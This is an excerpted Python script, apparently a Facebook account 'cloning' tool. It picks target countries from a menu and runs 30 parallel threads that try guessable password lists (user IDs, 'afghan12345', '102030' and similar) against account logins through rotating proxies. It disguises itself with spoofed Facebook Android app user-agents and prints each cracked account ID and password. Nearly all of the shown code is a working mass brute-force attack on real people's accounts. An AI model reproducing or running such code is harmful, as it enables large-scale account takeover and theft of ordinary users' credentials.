...
try:
	open('.prox.txt','w').write(requests.get('https://github.com/afglion5/UE/blob/main/ua.txt').text)
except requests.exceptions.ConnectionError:
	exit(' Network Is Too Slow ')
def prox():
    proxies = open('.prox.txt','r').read().splitlines()
    return {'http': 'ua://'+random.choice(proxies)}
...
def pak():
		...
		mthd = input(' \033[1;97mChoose: ')
		clear()
		print('\033[1;32m [1] \033[mPakistan Cloning \n\033[1;32m [2] \033[mAfghanistan Cloning \n\033[1;32m [3] \033[mNigeria Cloning \033[1;32m \n [4] \033[mIndia Cloning \n\033[1;32m ')
		linex()
		...
		with tred(max_workers=30) as Hamza:	
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					passlist = [psx,ids,'600700','afghanistan','Afghanistan','afghan12345','102030','khan12345','100200','500500','900900','500600','400500','10002000','۱۲۳۴۵۶۷۸۹','afghan123','kabul123','khankhan']
				elif pcs in ['3','03']:
					...
					passlist = [psx,ids,'23470','23481','23491','23490','57575751','23480']
				elif pcs in ['5','05']:
...
def api1(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "Davik/2.1.0 (linux; U; Android 7.0.1; Vivo Y35 Build/RKQ1.21110.002[FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/631707809;FBDM/{density=1.5,width=1280,height=720};FBLC/en_US;FBRV/631707809;FBCR/Marshmallow;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Vivo Y35;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
...
'Zero-Rated': '0',
'User-Agent': 'Davik/2.1.0 (Linux; U; Android 14; CPH2591 Build/UP1A.230620.001) [FBAN/MessengerLite;FBAV/310.0.0.8.84;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/406017845;FBCR/Robi;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2591;FBSV/14;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\x1b[38;5;246m [LION💔-CP] '+uid+' | '+pas+'\033[1;97m')
